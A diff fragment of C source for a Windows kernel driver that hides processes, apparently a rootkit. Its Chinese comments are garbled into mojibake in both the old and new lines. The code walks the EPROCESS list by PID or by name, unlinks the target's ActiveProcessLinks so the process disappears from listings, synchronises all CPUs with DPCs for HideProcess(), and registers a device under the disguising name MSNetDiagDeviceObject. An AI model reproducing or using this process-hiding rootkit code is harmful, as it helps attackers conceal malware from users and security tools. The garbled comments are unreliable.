-	//È»ºó±£³Ö²»±ä£¬²¢ÇÒµ±Ç°Ö´ĞĞ½ø³ÌµÄ EPROCESS ½á¹¹×÷ÎªÁ´±íÍ·£¬ÕâÑù targetPID ¾ÍÄÜ¹»±êÊ¶±íÍ·½ø³Ì
-	//ÁíÒ»·½Ãæ£¬¾Ö²¿±äÁ¿ currentPID ÔÚÃ¿Ò»´ÎÑ­»·µÄµü´úÖĞ¶¼±»¸üĞÂ£¬µ± currentPID µÈÓÚ targetPID Ê±£¬ËµÃ÷±¾´Îµü´úµ½´ïÁËÁ´±íµÄ½áÎ²
-	//£¨½áÎ²±íÏîµÄ LIST_ENTRY.Flink Ö¸Ïò±íÍ·µÄ LIST_ENTRY.Flink£©£¬¼´ currentPID ÔÙ´Î±»¸üĞÂÎª±íÍ·½ø³ÌµÄ PID Ê±£¬ÍË³öÑ­»·¡£
+	// while å¾ªç¯é€€å‡ºçš„æ¡ä»¶æ˜¯ï¼štargetPID == currentPIDï¼Œå› ä¸ºå‰é¢çš„ä»£ç é€»è¾‘å°† targetPID åˆå§‹åŒ–ä¸ºå½“å‰æ‰§è¡Œè¿›ç¨‹çš„ PIDï¼Œ
+	//ç„¶åä¿æŒä¸å˜ï¼Œå¹¶ä¸”å½“å‰æ‰§è¡Œè¿›ç¨‹çš„ EPROCESS ç»“æ„ä½œä¸ºé“¾è¡¨å¤´ï¼Œè¿™æ · targetPID å°±èƒ½å¤Ÿæ ‡è¯†è¡¨å¤´è¿›ç¨‹
+	//å¦ä¸€æ–¹é¢ï¼Œå±€éƒ¨å˜é‡ currentPID åœ¨æ¯ä¸€æ¬¡å¾ªç¯çš„è¿­ä»£ä¸­éƒ½è¢«æ›´æ–°ï¼Œå½“ currentPID ç­‰äº targetPID æ—¶ï¼Œè¯´æ˜æœ¬æ¬¡è¿­ä»£åˆ°è¾¾äº†é“¾è¡¨çš„ç»“å°¾
+	//ï¼ˆç»“å°¾è¡¨é¡¹çš„ LIST_ENTRY.Flink æŒ‡å‘è¡¨å¤´çš„ LIST_ENTRY.Flinkï¼‰ï¼Œå³ currentPID å†æ¬¡è¢«æ›´æ–°ä¸ºè¡¨å¤´è¿›ç¨‹çš„ PID æ—¶ï¼Œé€€å‡ºå¾ªç¯ã€‚
 	while (targetPID != currentPID)
 	{
 		if (currentPID == pid)
@@ -525,21 +531,21 @@ void  adjustProcessListEntry(BYTE*  currentEPROCESSpointer)
 	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
 	nextPID = getPID(nextEPROCESSpointer);
 
-	//·Ö±ğÈ¡µÃµ±Ç°ºÍÏàÁÚµÄ 2 ¸ö ERROCESS µÄ ActiveProcessLinks ×Ö¶Î£¨Ò»¸ö LIST_ENTRY ¶ÔÏó£©
+	//åˆ†åˆ«å–å¾—å½“å‰å’Œç›¸é‚»çš„ 2 ä¸ª ERROCESS çš„ ActiveProcessLinks å­—æ®µï¼ˆä¸€ä¸ª LIST_ENTRY å¯¹è±¡ï¼‰
 
 	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 
-	//·Ö±ğĞŞ¸ÄÈıÕßÖĞµÄÌØ¶¨×Ö¶Î£¨Flink »ò Blink£©£¬ÊµÏÖÒş²Øµ±Ç°µÄ ERROCESS
+	//åˆ†åˆ«ä¿®æ”¹ä¸‰è€…ä¸­çš„ç‰¹å®šå­—æ®µï¼ˆFlink æˆ– Blinkï¼‰ï¼Œå®ç°éšè—å½“å‰çš„ ERROCESS
 
-	//Ç°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink Ö¸ÏòÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-	//ÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Blink Ö¸ÏòÇ°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-	//Õâ¾ÍÈÆ¹ıÁËµ±Ç°£¨ÖĞ¼ä£©µÄ ERROCESS µÄ ActiveProcessLinks
+	//å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink æŒ‡å‘ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+	//ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Blink æŒ‡å‘å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+	//è¿™å°±ç»•è¿‡äº†å½“å‰ï¼ˆä¸­é—´ï¼‰çš„ ERROCESS çš„ ActiveProcessLinks
 	(*prevListEntry).Flink = nextListEntry;
 	(*nextListEntry).Blink = prevListEntry;
 
-	//µ±Ç° ERROCESS µÄ ActiveProcessLinks.Flink Óë ActiveProcessLinks.Blink Ö¸Ïò ActiveProcessLinks ×ÔÉí£¬´ÓÁ´±íÖĞ·ÖÀë
+	//å½“å‰ ERROCESS çš„ ActiveProcessLinks.Flink ä¸ ActiveProcessLinks.Blink æŒ‡å‘ ActiveProcessLinks è‡ªèº«ï¼Œä»é“¾è¡¨ä¸­åˆ†ç¦»
 	(*currentListEntry).Flink = currentListEntry;
 	(*currentListEntry).Blink = currentListEntry;
 
@@ -554,11 +560,11 @@ NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
 {
 	NTSTATUS ntStatus;
 	UNICODE_STRING unicodeString;
-	/* ÀûÓÃDeviceNameBufferÀ´³õÊ¼»¯unicodeString */
+	/* åˆ©ç”¨DeviceNameBufferæ¥åˆå§‹åŒ–unicodeString */
 	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
 	/*
-	 * ´´½¨Ò»¸öÉè±¸£¬Éè±¸ÀàĞÍÎªFILE_DEVICE_RK£¨ÓÉÎÒÃÇ×Ô¼ºÔÚdevice.hÖĞ¶¨Òå)£¬
-	 * ´´½¨µÄÉè±¸±£´æÔÚMSNetDiagDeviceObjectÖĞ
+	 * åˆ›å»ºä¸€ä¸ªè®¾å¤‡ï¼Œè®¾å¤‡ç±»å‹ä¸ºFILE_DEVICE_RKï¼ˆç”±æˆ‘ä»¬è‡ªå·±åœ¨device.hä¸­å®šä¹‰)ï¼Œ
+	 * åˆ›å»ºçš„è®¾å¤‡ä¿å­˜åœ¨MSNetDiagDeviceObjectä¸­
 	 */
 	ntStatus = IoCreateDevice
 		(
@@ -584,16 +590,16 @@ NTSTATUS RegisterDriverDeviceLink()
 	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
 	RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
 	/*
-	 * IoCreateSymbolicLink´´½¨Ò»¸öÉè±¸Á´½Ó¡£Çı¶¯³ÌĞòÖĞËäÈ»×¢²áÁËÉè±¸£¬
-	 * µ«ËüÖ»ÄÜÔÚÄÚºËÖĞ¿É¼û£¬ÎªÁËÊ¹Ó¦ÓÃ³ÌĞò¿É¼û£¬Çı¶¯ĞèÓ´°¡±©Â¶Ò»¸ö·ûºÅ
-	 * Á´½Ó£¬¸ÃÁ´½ÓÖ¸ÏòÕæÕıµÄÉè±¸Ãû
+	 * IoCreateSymbolicLinkåˆ›å»ºä¸€ä¸ªè®¾å¤‡é“¾æ¥ã€‚é©±åŠ¨ç¨‹åºä¸­è™½ç„¶æ³¨å†Œäº†è®¾å¤‡ï¼Œ
+	 * ä½†å®ƒåªèƒ½åœ¨å†…æ ¸ä¸­å¯è§ï¼Œä¸ºäº†ä½¿åº”ç”¨ç¨‹åºå¯è§ï¼Œé©±åŠ¨éœ€å“Ÿå•Šæš´éœ²ä¸€ä¸ªç¬¦å·
+	 * é“¾æ¥ï¼Œè¯¥é“¾æ¥æŒ‡å‘çœŸæ­£çš„è®¾å¤‡å
 	 */
 	ntStatus = IoCreateSymbolicLink(&unicodeLinkString, &unicodeString);
 	return (ntStatus);
 }
 
 
-//ÏÂÃæÕâĞ©º¯ÊıÓÃÓÚÔÚSMPÏµÍ³ÉÏÍ¬²½¶ÔWindowsÄÚºË×ÊÔ´µÄ·ÃÎÊ£¬ËüÃÇÒªÃ´Ö±½Ó»ò¼ä½ÓÔÚ HideProcess() ÖĞ±»µ÷ÓÃ£º
+//ä¸‹é¢è¿™äº›å‡½æ•°ç”¨äºåœ¨SMPç³»ç»Ÿä¸ŠåŒæ­¥å¯¹Windowså†…æ ¸èµ„æºçš„è®¿é—®ï¼Œå®ƒä»¬è¦ä¹ˆç›´æ¥æˆ–é—´æ¥åœ¨ HideProcess() ä¸­è¢«è°ƒç”¨ï¼š
 
 KIRQL  RaiseIRQL() {
 		KIRQL  curr;
@@ -618,9 +624,9 @@ PKDPC  AcquireLock() {
 		DBG_TRACE("AcquireLock",  "current cpu Executing at IRQL == DISPATCH_LEVEL");
 		InterlockedAnd(&has_finished_access_os_res,  0);
 		InterlockedAnd(&nCPUsLocked,  0);
-		DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n",  KeNumberProcessors);// %u:  ÎŞ·ûºÅÊ®½øÖÆÕûÊı¡£
+		DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n",  KeNumberProcessors);// %u:  æ— ç¬¦å·åè¿›åˆ¶æ•´æ•°ã€‚
 
-		//´Ë´¦µÄ ExAllocatePoolWithTag() µ÷ÓÃÓï¾äµÄ²ÎÊı²¿·ÖĞèÒª»»ĞĞÊéĞ´£¬·ñÔòÓÉÓÚÎ´ÖªÔ­Òò£¬»á±¨´í¸Ãº¯ÊıÎ´¶¨Òå
+		//æ­¤å¤„çš„ ExAllocatePoolWithTag() è°ƒç”¨è¯­å¥çš„å‚æ•°éƒ¨åˆ†éœ€è¦æ¢è¡Œä¹¦å†™ï¼Œå¦åˆ™ç”±äºæœªçŸ¥åŸå› ï¼Œä¼šæŠ¥é”™è¯¥å‡½æ•°æœªå®šä¹‰
 		dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
 			KeNumberProcessors * sizeof(KDPC), 0xABCD);
 		if (dpcArray == NULL) {
@@ -741,16 +747,16 @@ void  WalkProcessListWithName(unsigned char* trg_proc_nme){
 	currentEPROCESSpointer = nextEPROCESSpointer;
 	current_proc_name = get_proc_name(currentEPROCESSpointer);
 
-// ´úÂëÖ´ĞĞµ½´Ë´¦£¬current_proc_name£ºÏÂÒ»¸ö½ø³ÌÃû³Æ
-//				target_proc_name£ºµ±Ç°½ø³ÌÃû³Æ
-//				nextEPROCESSpointer£ºÖ¸ÏòÏÂÒ»¸ö½ø³Ì
-//				currentEPROCESSpointer£ºÖ¸ÏòÏÂÒ»¸ö½ø³Ì
-// »­³ö´Ëº¯ÊıµÄÂß¼­Á÷³Ì
-// while Ñ­»·ÍË³öµÄÌõ¼şÊÇ£ºtarget_proc_name == current_proc_name£¬ÒòÎªÇ°ÃæµÄ´úÂëÂß¼­½« target_proc_name ³õÊ¼»¯Îªµ±Ç°Ö´ĞĞ½ø³ÌµÄÃû³Æ£¬
-//È»ºó±£³Ö²»±ä£¬²¢ÇÒµ±Ç°Ö´ĞĞ½ø³ÌµÄ EPROCESS ½á¹¹×÷ÎªÁ´±íÍ·£¬ÕâÑù target_proc_name ¾ÍÄÜ¹»±êÊ¶±íÍ·½ø³ÌÃû³Æ
-//ÁíÒ»·½Ãæ£¬¾Ö²¿±äÁ¿ current_proc_name ÔÚÃ¿Ò»´ÎÑ­»·µÄµü´úÖĞ¶¼±»¸üĞÂ£¬µ± current_proc_name µÈÓÚ target_proc_name Ê±£¬
-ËµÃ÷±¾´Îµü´úµ½´ïÁËÁ´±íµÄ½áÎ²
-//£¨½áÎ²±íÏîµÄ LIST_ENTRY.Flink Ö¸Ïò±íÍ·µÄ LIST_ENTRY.Flink£©£¬¼´ current_proc_name ÔÙ´Î±»¸üĞÂÎª±íÍ·½ø³ÌµÄ PID Ê±£¬ÍË³öÑ­»·¡£
+// ä»£ç æ‰§è¡Œåˆ°æ­¤å¤„ï¼Œcurrent_proc_nameï¼šä¸‹ä¸€ä¸ªè¿›ç¨‹åç§°
+//				target_proc_nameï¼šå½“å‰è¿›ç¨‹åç§°
+//				nextEPROCESSpointerï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªè¿›ç¨‹
+//				currentEPROCESSpointerï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªè¿›ç¨‹
+// ç”»å‡ºæ­¤å‡½æ•°çš„é€»è¾‘æµç¨‹
+// while å¾ªç¯é€€å‡ºçš„æ¡ä»¶æ˜¯ï¼štarget_proc_name == current_proc_nameï¼Œå› ä¸ºå‰é¢çš„ä»£ç é€»è¾‘å°† target_proc_name åˆå§‹åŒ–ä¸ºå½“å‰æ‰§è¡Œè¿›ç¨‹çš„åç§°ï¼Œ
+//ç„¶åä¿æŒä¸å˜ï¼Œå¹¶ä¸”å½“å‰æ‰§è¡Œè¿›ç¨‹çš„ EPROCESS ç»“æ„ä½œä¸ºé“¾è¡¨å¤´ï¼Œè¿™æ · target_proc_name å°±èƒ½å¤Ÿæ ‡è¯†è¡¨å¤´è¿›ç¨‹åç§°
+//å¦ä¸€æ–¹é¢ï¼Œå±€éƒ¨å˜é‡ current_proc_name åœ¨æ¯ä¸€æ¬¡å¾ªç¯çš„è¿­ä»£ä¸­éƒ½è¢«æ›´æ–°ï¼Œå½“ current_proc_name ç­‰äº target_proc_name æ—¶ï¼Œ
+è¯´æ˜æœ¬æ¬¡è¿­ä»£åˆ°è¾¾äº†é“¾è¡¨çš„ç»“å°¾
+//ï¼ˆç»“å°¾è¡¨é¡¹çš„ LIST_ENTRY.Flink æŒ‡å‘è¡¨å¤´çš„ LIST_ENTRY.Flinkï¼‰ï¼Œå³ current_proc_name å†æ¬¡è¢«æ›´æ–°ä¸ºè¡¨å¤´è¿›ç¨‹çš„ PID æ—¶ï¼Œé€€å‡ºå¾ªç¯ã€‚
 
 	while ( stricmp(target_proc_name, current_proc_name) != 0 )
 	{
@@ -793,22 +799,22 @@ void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
 	prevEPROCESSpointer = getPreviousEPROCESSpointer(currentEPROCESSpointer);
 	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
 
-	//·Ö±ğÈ¡µÃµ±Ç°ºÍÏàÁÚµÄ 2 ¸ö ERROCESS µÄ ActiveProcessLinks ×Ö¶Î£¨Ò»¸ö LIST_ENTRY ¶ÔÏó£©
+	//åˆ†åˆ«å–å¾—å½“å‰å’Œç›¸é‚»çš„ 2 ä¸ª ERROCESS çš„ ActiveProcessLinks å­—æ®µï¼ˆä¸€ä¸ª LIST_ENTRY å¯¹è±¡ï¼‰
 
 	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 
-	//·Ö±ğĞŞ¸ÄÈıÕßÖĞµÄÌØ¶¨×Ö¶Î£¨Flink »ò Blink£©£¬ÊµÏÖÒş²Øµ±Ç°µÄ ERROCESS
+	//åˆ†åˆ«ä¿®æ”¹ä¸‰è€…ä¸­çš„ç‰¹å®šå­—æ®µï¼ˆFlink æˆ– Blinkï¼‰ï¼Œå®ç°éšè—å½“å‰çš„ ERROCESS
 
-	//Ç°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink Ö¸ÏòÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-	//ÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Blink Ö¸ÏòÇ°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-	//Õâ¾ÍÈÆ¹ıÁËµ±Ç°£¨ÖĞ¼ä£©µÄ ERROCESS µÄ ActiveProcessLinks
+	//å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink æŒ‡å‘ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+	//ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Blink æŒ‡å‘å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+	//è¿™å°±ç»•è¿‡äº†å½“å‰ï¼ˆä¸­é—´ï¼‰çš„ ERROCESS çš„ ActiveProcessLinks
 	(*prevListEntry).Flink = nextListEntry;
 	(*nextListEntry).Blink = prevListEntry;
 
-	//µ±Ç° ERROCESS µÄ ActiveProcessLinks.Flink Óë ActiveProcessLinks.Blink Ö¸Ïò ActiveProcessLinks ×ÔÉí£¬
-	//´ÓÁ´±íÖĞ·ÖÀë
+	//å½“å‰ ERROCESS çš„ ActiveProcessLinks.Flink ä¸ ActiveProcessLinks.Blink æŒ‡å‘ ActiveProcessLinks è‡ªèº«ï¼Œ
+	//ä»é“¾è¡¨ä¸­åˆ†ç¦»
 	(*currentListEntry).Flink = currentListEntry;
 	(*currentListEntry).Blink = currentListEntry;
 
@@ -844,8 +850,8 @@ BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
 unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
 	unsigned char* proc_name;
 
-	// _EPROCESS.ImageFileName ×Ö¶Î¾ÍÊÇÒ»¸ö UCHAR£¨Òà¼´ unsigned char£©ĞÍÊı×é£¬
-	//ÔÚ NT5.2 °æÄÚºË£¨ÓÃÓÚwindows xp ,2003£©ÖĞ³¤¶È 16 ×Ö½Ú£¬ÔÚ NT6.2 °æÄÚºË£¨ÓÃÓÚwindows 7, 2008£©ÖĞ³¤¶È 15 ×Ö½Ú
+	// _EPROCESS.ImageFileName å­—æ®µå°±æ˜¯ä¸€ä¸ª UCHARï¼ˆäº¦å³ unsigned charï¼‰å‹æ•°ç»„ï¼Œ
+	//åœ¨ NT5.2 ç‰ˆå†…æ ¸ï¼ˆç”¨äºwindows xp ,2003ï¼‰ä¸­é•¿åº¦ 16 å­—èŠ‚ï¼Œåœ¨ NT6.2 ç‰ˆå†…æ ¸ï¼ˆç”¨äºwindows 7, 2008ï¼‰ä¸­é•¿åº¦ 15 å­—èŠ‚
 	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
 	return (proc_name);
 }
